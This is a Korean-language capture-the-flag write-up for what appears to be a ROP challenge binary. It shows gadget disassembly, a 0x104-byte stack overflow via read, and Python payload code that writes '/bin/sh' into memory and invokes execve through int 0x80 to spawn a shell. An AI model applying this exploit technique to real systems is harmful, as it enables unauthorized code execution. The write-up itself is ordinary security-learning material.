## 함수 분석 / 취약점 발견
* checksec으로 NX bit가 걸려있어 기존의 LOB처럼 stack에서 shellcode를 실행시키지는 못한다.
rop1처럼 gadget이 두개 존재한다.
### gadget
```
   0x080483db <+0>:	add    DWORD PTR [ebx],eax
   0x080483dd <+2>:	ret    
```
### gadget2
```
   0x080483de <+0>:	mov    eax,ebx
   0x080483e0 <+2>:	ret
```
1. gadget과 연동해 원하는 주소에 원하는 값을 사용할 수 있다. ebx의 값을 조정할 수 있다면 좋을 것이다.
2. 따라서 추가로 ebx를 pop하는 gadget을 `0x08048486`에서 발견해 사용하였다.
```
gdb-peda$ x/2i 0x08048486
   0x8048486 <_fini+18>:	pop    ebx
   0x8048487 <_fini+19>:	ret
```
### main
1. ebp-0x100에 read 함수를 호출한다. 200byte만큼 입력을 받으므로 return address를 덮어씌울 수 있다.
2. int 0x80이 존재해 차후 execve를 호출하는데 쓰일 수 있다(eax = 0x11이면 호출 가능)


## 구현
1. 스택 + ebp의 크기가 0x104이므로 return address에 덮어씌우기전 먼저 채워준다.
```python
payload = b'\x00'*0x104
```
2. 이후 /bin/sh에 해당하는 ascii 값을 입력시켜준다.
```
for index, asciinum in enumerate([47, 98, 105, 110, 47, 115, 104]):
    payload += popebx_addr + p32(asciinum) + gadget2_addr
    payload += popebx_addr + p32(binsh_addr + index) + gadget_addr
```
* 각 ascii num을 입력하는 방식은 다음과 같다.
    1. pop ebx gadget으로 ebx을 원하는 ascii num으로 변경
    2. gadget2로 eax에 ebx의 값(ascii num)을 옮겨담음
    3. pop ebx gadget으로 문자열을 옮겨담을 주소를 입력(stack에 옮겨담음, bss도 가능)
        * stack에 옮겨담는 경우 stack의 주소가 변하면
    4. gadget으로 [ebx]에 ascii num인 eax를 입력
3. gadget과 gadget2로 eax, ebx에 11, /bin/sh의 주소 입력후 int 0x80으로 ret
```
payload += popebx_addr + p32(11) + gadget2_addr + p32(0x08048368) + popebx_addr + p32(binsh_addr) + int80_addr
```